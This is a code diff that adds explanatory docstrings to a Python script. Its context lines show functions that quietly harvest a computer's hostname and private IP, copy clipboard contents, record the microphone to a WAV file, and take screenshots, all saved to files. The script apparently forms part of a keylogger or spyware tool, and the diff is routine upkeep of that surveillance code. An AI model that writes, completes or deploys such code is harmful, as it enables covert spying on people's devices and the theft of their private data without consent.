@@ -87,6 +87,10 @@ file_merge = file_path + extend
 ''' Get the computer information. '''
 
 def computer_information():
+    """
+    This function will write the computer information to the system_information file.
+    It will write the processor, system, machine, hostname, and private IP address.
+    """
     with open(file_path + extend + system_information, "a") as f:
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
@@ -108,6 +112,12 @@ computer_information()
 ''' Get the clipboard contents. '''
 
 def copy_clipboard():
+    """
+    This function copies the clipboard data and writes it to a file.
+    The file is located in the same directory as the script.
+    The file is named clipboard_information.txt
+    The file is appended with the clipboard data.
+    """
     with open(file_path + extend + clipboard_information, "a") as f:
         try:
             win32clipboard.OpenClipboard()
@@ -124,6 +134,13 @@ copy_clipboard()
 ''' Geting the Microphone '''
 
 def microphone():
+    """
+    This function records the audio from the microphone for a certain amount of time.
+    The audio is saved in the file_path with the name audio_information.
+    The audio is saved in the format .wav.
+    The sampling rate is 44100 Hz.
+    The audio is 2 channels.
+    """
     fs = 44100
     seconds = microphone_time
 
@@ -137,6 +154,11 @@ microphone()
 ''' Get screenshots '''
 
 def screenshot():
+    """
+    This fun Takes a screenshot of the screen and saves it to the file path.
+    The file name is specified in the screenshot_information variable.
+    The file extension is specified in the extend variable.
+    """
     im = ImageGrab.grab()
     im.save(file_path + extend + screenshot_information)
 
